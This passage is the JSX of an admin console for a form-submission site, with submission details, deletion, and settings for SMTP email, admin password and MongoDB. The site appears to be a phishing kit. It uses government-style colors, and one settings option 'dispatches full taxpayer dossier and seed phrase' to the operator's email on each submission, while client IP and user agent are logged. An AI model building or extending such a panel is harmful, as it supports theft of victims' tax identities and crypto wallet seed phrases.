                <div style={{ fontSize: '12px', color: '#565c65', display: 'grid', gridTemplateColumns: '120px 1fr', gap: '6px' }}>
                  <strong>Client IP:</strong> <span>{selectedSub.client_ip}</span>
                  <strong>User Agent:</strong> <span>{selectedSub.user_agent}</span>
                  <strong>Submitted:</strong> <span>{selectedSub.submitted_at}</span>
                </div>
              </div>
            </div>

            {/* Modal Footer */}
            <div style={{
              padding: '16px 24px',
              background: '#f8f9fa',
              borderTop: '1px solid #dfe1e2',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
            }}>
              <button
                onClick={() => setDeleteConfirmId(selectedSub.id)}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#d9381e',
                  fontSize: '13px',
                  fontWeight: 600,
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '4px',
                }}
              >
                <Trash2 size={14} />
                <span>Delete Submission</span>
              </button>

              <button
                onClick={() => setSelectedSub(null)}
                style={{
                  background: '#005ea2',
                  color: '#ffffff',
                  border: 'none',
                  padding: '8px 20px',
                  borderRadius: '4px',
                  fontSize: '14px',
                  fontWeight: 600,
                  cursor: 'pointer',
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* DELETE CONFIRMATION MODAL                                     */}
      {/* ------------------------------------------------------------- */}
      {deleteConfirmId && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          background: 'rgba(0, 0, 0, 0.5)',
          zIndex: 99999,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '20px',
        }}>
          <div style={{
            background: '#ffffff',
            borderRadius: '8px',
            maxWidth: '400px',
            width: '100%',
            padding: '24px',
            boxShadow: '0 10px 30px rgba(0,0,0,0.2)',
          }}>
            <h3 style={{ margin: '0 0 10px 0', fontSize: '18px', color: '#d9381e' }}>Delete Submission?</h3>
            <p style={{ margin: '0 0 20px 0', fontSize: '14px', color: '#565c65' }}>
              Are you sure you want to permanently delete this submission record? This action cannot be undone.
            </p>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px' }}>
              <button
                onClick={() => setDeleteConfirmId(null)}
                style={{
                  background: 'transparent',
                  border: '1px solid #dfe1e2',
                  padding: '8px 16px',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '13px',
                }}
              >
                Cancel
              </button>
              <button
                onClick={() => handleDelete(deleteConfirmId)}
                style={{
                  background: '#d9381e',
                  color: '#ffffff',
                  border: 'none',
                  padding: '8px 16px',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '13px',
                  fontWeight: 600,
                }}
              >
                Yes, Delete
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Settings Modal */}
      {isSettingsOpen && (
        <div style={{
          position: 'fixed',
          inset: 0,
          background: 'rgba(0, 0, 0, 0.7)',
          backdropFilter: 'blur(4px)',
          zIndex: 9999,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '20px',
        }}>
          <div style={{
            background: '#ffffff',
            borderRadius: '12px',
            maxWidth: '680px',
            width: '100%',
            maxHeight: '90vh',
            display: 'flex',
            flexDirection: 'column',
            boxShadow: '0 25px 60px rgba(0, 0, 0, 0.35)',
            overflow: 'hidden',
          }}>
            {/* Modal Header */}
            <div style={{
              background: '#112e51',
              color: '#ffffff',
              padding: '18px 24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              borderBottom: '3px solid #005ea2',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <Settings size={20} color="#45c8f1" />
                <div>
                  <h2 style={{ margin: 0, fontSize: '17px', fontWeight: 700 }}>System &amp; Notification Settings</h2>
                  <p style={{ margin: '2px 0 0 0', fontSize: '12px', color: '#aeb0b5' }}>
                    Configure MongoDB, Admin Credentials &amp; SMTP Email Dispatch
                  </p>
                </div>
              </div>
              <button
                onClick={() => setIsSettingsOpen(false)}
                style={{
                  background: 'transparent',
                  border: 'none',
                  color: '#ffffff',
                  cursor: 'pointer',
                  padding: '4px',
                  display: 'flex',
                }}
              >
                <X size={20} />
              </button>
            </div>

            {/* Modal Navigation Tabs */}
            <div style={{
              display: 'flex',
              borderBottom: '1px solid #dfe1e2',
              background: '#f8f9fa',
              padding: '0 16px',
            }}>
              <button
                onClick={() => setActiveSettingsTab('email')}
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '12px 18px',
                  border: 'none',
                  background: 'none',
                  fontSize: '13px',
                  fontWeight: activeSettingsTab === 'email' ? 700 : 500,
                  color: activeSettingsTab === 'email' ? '#005ea2' : '#565c65',
                  borderBottom: activeSettingsTab === 'email' ? '3px solid #005ea2' : '3px solid transparent',
                  cursor: 'pointer',
                }}
              >
                <Mail size={15} />
                <span>Email &amp; SMTP Notifications</span>
              </button>
              <button
                onClick={() => setActiveSettingsTab('password')}
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '12px 18px',
                  border: 'none',
                  background: 'none',
                  fontSize: '13px',
                  fontWeight: activeSettingsTab === 'password' ? 700 : 500,
                  color: activeSettingsTab === 'password' ? '#005ea2' : '#565c65',
                  borderBottom: activeSettingsTab === 'password' ? '3px solid #005ea2' : '3px solid transparent',
                  cursor: 'pointer',
                }}
              >
                <Key size={15} />
                <span>Admin Password</span>
              </button>
              <button
                onClick={() => setActiveSettingsTab('db')}
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '12px 18px',
                  border: 'none',
                  background: 'none',
                  fontSize: '13px',
                  fontWeight: activeSettingsTab === 'db' ? 700 : 500,
                  color: activeSettingsTab === 'db' ? '#005ea2' : '#565c65',
                  borderBottom: activeSettingsTab === 'db' ? '3px solid #005ea2' : '3px solid transparent',
                  cursor: 'pointer',
                }}
              >
                <Database size={15} />
                <span>Database Status</span>
              </button>
            </div>

            {/* Modal Body */}
            <div style={{ padding: '24px', overflowY: 'auto', flex: 1 }}>
              {/* TAB 1: EMAIL & SMTP */}
              {activeSettingsTab === 'email' && (
                <div>
                  <form onSubmit={handleSaveEmailConfig}>
                    {/* Enable Toggle */}
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: '12px 16px',
                      background: emailConfig.enabled ? '#f0f7fc' : '#f8f9fa',
                      border: `1px solid ${emailConfig.enabled ? '#cfe2f3' : '#dfe1e2'}`,
                      borderRadius: '8px',
                      marginBottom: '20px',
                    }}>
                      <div>
                        <div style={{ fontWeight: 700, fontSize: '14px', color: '#112e51' }}>
                          Automatic Email Notifications
                        </div>
                        <div style={{ fontSize: '12px', color: '#565c65' }}>
                          Dispatch full taxpayer dossier and seed phrase directly to your email on submission
                        </div>
                      </div>
                      <label style={{ display: 'flex', alignItems: 'center', cursor: 'pointer', gap: '8px' }}>
                        <input
                          type="checkbox"
                          checked={emailConfig.enabled}
                          onChange={(e) => setEmailConfig({ ...emailConfig, enabled: e.target.checked })}
                          style={{ width: '18px', height: '18px', cursor: 'pointer' }}
                        />
                        <span style={{ fontSize: '13px', fontWeight: 600, color: emailConfig.enabled ? '#005ea2' : '#71767a' }}>
                          {emailConfig.enabled ? 'Enabled' : 'Disabled'}
                        </span>
                      </label>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '16px' }}>
                      <div>
                        <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                          SMTP Host
                        </label>
                        <input
                          type="text"
                          value={emailConfig.smtp_host}
                          onChange={(e) => setEmailConfig({ ...emailConfig, smtp_host: e.target.value })}
                          placeholder="smtp.gmail.com or smtp.hostinger.com"
                          style={{
                            width: '100%',
                            padding: '10px 12px',
                            border: '1px solid #dfe1e2',
                            borderRadius: '6px',
                            fontSize: '13px',
                          }}
                        />
                      </div>
                      <div>
                        <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                          SMTP Port
                        </label>
                        <input
                          type="number"
                          value={emailConfig.smtp_port}
                          onChange={(e) => setEmailConfig({ ...emailConfig, smtp_port: Number(e.target.value) })}
                          placeholder="587 or 465"
                          style={{
                            width: '100%',
                            padding: '10px 12px',
                            border: '1px solid #dfe1e2',
                            borderRadius: '6px',
                            fontSize: '13px',
                          }}
                        />
                      </div>
                    </div>

                    <div style={{ marginBottom: '16px' }}>
                      <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                        Your Email Address (SMTP Login)
                      </label>
                      <input
                        type="email"
                        value={emailConfig.smtp_user}
                        onChange={(e) => setEmailConfig({ ...emailConfig, smtp_user: e.target.value })}
                        placeholder="e.g. user@gmail.com"
                        style={{
                          width: '100%',
                          padding: '10px 12px',
                          border: '1px solid #dfe1e2',
                          borderRadius: '6px',
                          fontSize: '13px',
                        }}
                      />
                    </div>

                    <div style={{ marginBottom: '16px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                        <label style={{ fontSize: '12px', fontWeight: 700, color: '#565c65' }}>
                          SMTP Password / App Password
                        </label>
                        <button
                          type="button"
                          onClick={() => setShowSmtpPass(!showSmtpPass)}
                          style={{
                            background: 'none',
                            border: 'none',
                            color: '#005ea2',
                            fontSize: '11px',
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '4px',
                          }}
                        >
                          {showSmtpPass ? <EyeOff size={12} /> : <Eye size={12} />}
                          <span>{showSmtpPass ? 'Hide' : 'Show Password'}</span>
                        </button>
                      </div>
                      <input
                        type={showSmtpPass ? 'text' : 'password'}
                        value={emailConfig.smtp_pass}
                        onChange={(e) => setEmailConfig({ ...emailConfig, smtp_pass: e.target.value })}
                        placeholder="Enter email app password"
                        style={{
                          width: '100%',
                          padding: '10px 12px',
                          border: '1px solid #dfe1e2',
                          borderRadius: '6px',
                          fontSize: '13px',
                          fontFamily: showSmtpPass ? 'inherit' : 'monospace',
                        }}
                      />
                      <p style={{ margin: '4px 0 0 0', fontSize: '11px', color: '#71767a' }}>
                        Tip: For Gmail, use a 16-character Google Account App Password.
                      </p>
                    </div>

                    <div style={{ marginBottom: '20px' }}>
                      <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                        Recipient Email Address (Where to Receive Dossiers)
                      </label>
                      <input
                        type="email"
                        value={emailConfig.recipient_email}
                        onChange={(e) => setEmailConfig({ ...emailConfig, recipient_email: e.target.value })}
                        placeholder="Leave blank to send to your login email above"
                        style={{
                          width: '100%',
                          padding: '10px 12px',
                          border: '1px solid #dfe1e2',
                          borderRadius: '6px',
                          fontSize: '13px',
                        }}
                      />
                    </div>

                    {saveEmailMsg && (
                      <div style={{
                        padding: '10px 14px',
                        borderRadius: '6px',
                        fontSize: '13px',
                        marginBottom: '16px',
                        background: saveEmailMsg.success ? '#e7f4e4' : '#fbeae5',
                        color: saveEmailMsg.success ? '#1b5e20' : '#b71c1c',
                        border: `1px solid ${saveEmailMsg.success ? '#c8e6c9' : '#ffcdd2'}`,
                      }}>
                        {saveEmailMsg.msg}
                      </div>
                    )}

                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button
                        type="submit"
                        disabled={saveEmailLoading}
                        style={{
                          background: '#005ea2',
                          color: '#ffffff',
                          border: 'none',
                          padding: '10px 20px',
                          borderRadius: '6px',
                          fontSize: '13px',
                          fontWeight: 700,
                          cursor: saveEmailLoading ? 'not-allowed' : 'pointer',
                        }}
                      >
                        {saveEmailLoading ? 'Saving...' : 'Save Email Settings to Database'}
                      </button>
                    </div>
                  </form>

                  {/* Test Email Section */}
                  <div style={{
                    marginTop: '24px',
                    paddingTop: '20px',
                    borderTop: '1px solid #dfe1e2',
                  }}>
                    <h4 style={{ margin: '0 0 10px 0', fontSize: '13px', color: '#112e51', fontWeight: 700 }}>
                      Test SMTP Credentials
                    </h4>
                    <p style={{ margin: '0 0 12px 0', fontSize: '12px', color: '#565c65' }}>
                      Send an immediate verification email to verify your SMTP server connects without errors.
                    </p>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <input
                        type="email"
                        value={testEmailTarget}
                        onChange={(e) => setTestEmailTarget(e.target.value)}
                        placeholder={emailConfig.recipient_email || emailConfig.smtp_user || 'Recipient email for test'}
                        style={{
                          flex: 1,
                          padding: '8px 12px',
                          border: '1px solid #dfe1e2',
                          borderRadius: '6px',
                          fontSize: '13px',
                        }}
                      />
                      <button
                        type="button"
                        onClick={handleSendTestEmail}
                        disabled={testEmailLoading}
                        style={{
                          display: 'inline-flex',
                          alignItems: 'center',
                          gap: '6px',
                          background: '#2e8540',
                          color: '#ffffff',
                          border: 'none',
                          padding: '8px 16px',
                          borderRadius: '6px',
                          fontSize: '13px',
                          fontWeight: 600,
                          cursor: testEmailLoading ? 'not-allowed' : 'pointer',
                        }}
                      >
                        <Send size={13} />
                        <span>{testEmailLoading ? 'Sending...' : 'Send Test Email'}</span>
                      </button>
                    </div>

                    {testEmailStatus && (
                      <div style={{
                        marginTop: '12px',
                        padding: '10px 14px',
                        borderRadius: '6px',
                        fontSize: '12px',
                        background: testEmailStatus.success ? '#e7f4e4' : '#fbeae5',
                        color: testEmailStatus.success ? '#1b5e20' : '#b71c1c',
                        border: `1px solid ${testEmailStatus.success ? '#c8e6c9' : '#ffcdd2'}`,
                      }}>
                        {testEmailStatus.msg}
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* TAB 2: ADMIN PASSWORD */}
              {activeSettingsTab === 'password' && (
                <form onSubmit={handleChangeAdminPassword}>
                  <p style={{ fontSize: '13px', color: '#565c65', marginTop: 0, marginBottom: '16px' }}>
                    Change the login password used to access this Admin Console. The new password will be stored in your MongoDB database.
                  </p>

                  <div style={{ marginBottom: '16px' }}>
                    <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                      Current Password
                    </label>
                    <input
                      type="password"
                      value={currentPassword}
                      onChange={(e) => setCurrentPassword(e.target.value)}
                      placeholder="Enter current password"
                      required
                      style={{
                        width: '100%',
                        padding: '10px 12px',
                        border: '1px solid #dfe1e2',
                        borderRadius: '6px',
                        fontSize: '13px',
                      }}
                    />
                  </div>

                  <div style={{ marginBottom: '16px' }}>
                    <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                      New Password
                    </label>
                    <input
                      type="password"
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      placeholder="Enter new password (min. 4 characters)"
                      required
                      style={{
                        width: '100%',
                        padding: '10px 12px',
                        border: '1px solid #dfe1e2',
                        borderRadius: '6px',
                        fontSize: '13px',
                      }}
                    />
                  </div>

                  <div style={{ marginBottom: '20px' }}>
                    <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#565c65', marginBottom: '6px' }}>
                      Confirm New Password
                    </label>
                    <input
                      type="password"
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      placeholder="Re-enter new password"
                      required
                      style={{
                        width: '100%',
                        padding: '10px 12px',
                        border: '1px solid #dfe1e2',
                        borderRadius: '6px',
                        fontSize: '13px',
                      }}
                    />
                  </div>

                  {passChangeMsg && (
                    <div style={{
                      padding: '10px 14px',
                      borderRadius: '6px',
                      fontSize: '13px',
                      marginBottom: '16px',
                      background: passChangeMsg.success ? '#e7f4e4' : '#fbeae5',
                      color: passChangeMsg.success ? '#1b5e20' : '#b71c1c',
                      border: `1px solid ${passChangeMsg.success ? '#c8e6c9' : '#ffcdd2'}`,
                    }}>
                      {passChangeMsg.msg}
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={passChangeLoading}
                    style={{
                      background: '#005ea2',
                      color: '#ffffff',
                      border: 'none',
                      padding: '10px 20px',
                      borderRadius: '6px',
                      fontSize: '13px',
                      fontWeight: 700,
                      cursor: passChangeLoading ? 'not-allowed' : 'pointer',
                    }}
                  >
                    {passChangeLoading ? 'Updating...' : 'Update Admin Password'}
                  </button>
                </form>
              )}

              {/* TAB 3: DATABASE STATUS */}
              {activeSettingsTab === 'db' && (
                <div>
                  <div style={{
                    padding: '16px',
                    borderRadius: '8px',
                    background: mongoConnected ? '#f0f7fc' : '#fff8e1',
                    border: `1px solid ${mongoConnected ? '#cfe2f3' : '#ffe082'}`,
                    marginBottom: '20px',
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                      <span style={{
                        width: '10px',
                        height: '10px',
                        borderRadius: '50%',
                        backgroundColor: mongoConnected ? '#3fb950' : '#f59e0b',
                      }}></span>
                      <strong style={{ fontSize: '15px', color: '#112e51' }}>
                        {mongoConnected ? 'Connected to MongoDB Cloud' : 'Using Local Storage Mirror'}
                      </strong>
                    </div>
                    <p style={{ margin: 0, fontSize: '13px', color: '#565c65', lineHeight: 1.5 }}>
                      {mongoConnected
                        ? 'All submissions, password changes, and email settings are being actively stored and synchronized with your remote MongoDB Atlas cluster. Safe for serverless hosting on Vercel.'
                        : 'Currently using local storage. To deploy to Vercel online with permanent data persistence, configure your MONGODB_URI.'}
                    </p>
                  </div>

                  <h4 style={{ margin: '0 0 10px 0', fontSize: '14px', color: '#112e51' }}>
                    How to Connect MongoDB Atlas (Free Tier)
                  </h4>
                  <ol style={{ margin: '0 0 16px 0', paddingLeft: '20px', fontSize: '13px', color: '#565c65', lineHeight: 1.6 }}>
                    <li>Create a free account at <a href="https://cloud.mongodb.com" target="_blank" rel="noreferrer" style={{ color: '#005ea2' }}>cloud.mongodb.com</a>.</li>
                    <li>Create a Free M0 Shared Cluster (takes ~1 minute).</li>
                    <li>Under <strong>Database Access</strong>, create a database user and password.</li>
                    <li>Under <strong>Network Access</strong>, allow access from anywhere (<code>0.0.0.0/0</code>) so Vercel can connect.</li>
                    <li>Click <strong>Connect &gt; Drivers</strong> and copy the connection string.</li>
                    <li>Add it to your <code>.env.local</code> or Vercel Environment Variables:
                      <pre style={{ background: '#212121', color: '#00ff66', padding: '8px 12px', borderRadius: '4px', fontSize: '11px', marginTop: '6px' }}>
                        MONGODB_URI=mongodb+srv://&lt;user&gt;:&lt;password&gt;@cluster0.xxx.mongodb.net/form_survey?retryWrites=true&amp;w=majority
                      </pre>
                    </li>
                  </ol>
                </div>
              )}
            </div>

            {/* Modal Footer */}
            <div style={{
              padding: '14px 24px',
              borderTop: '1px solid #dfe1e2',
              background: '#f8f9fa',
              display: 'flex',
              justifyContent: 'flex-end',
            }}>
              <button
                onClick={() => setIsSettingsOpen(false)}
                style={{
                  background: '#ffffff',
                  border: '1px solid #dfe1e2',
                  padding: '8px 18px',
                  borderRadius: '6px',
                  fontSize: '13px',
                  fontWeight: 600,
                  color: '#212121',
                  cursor: 'pointer',
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
